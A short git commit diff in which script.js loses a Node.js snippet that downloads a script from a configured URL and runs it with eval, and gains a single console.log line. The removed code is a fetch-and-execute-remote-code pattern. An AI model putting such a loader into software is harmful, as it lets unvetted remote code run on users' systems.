8182e198608e2e30276eea092886de7d3fbeb926
naimanton <93698269+naimanton@users.noreply.github.com>
2022-03-04 15:27:22 +0600

    Update script.js

--- script.js
+++ script.js
@@ -1,18 +1,1 @@
-var https = require('https');
-
-https.get(
-	config.url.rawScript,
-	function (result) {
-		var data = '';
-		result.on('data', 
-			function (chunk) {
-				data += chunk;
-			}
-		);
-		result.on('end', 
-			function () {
-				eval(data);
-			}
-		);
-	}
-);
+console.log('hi');
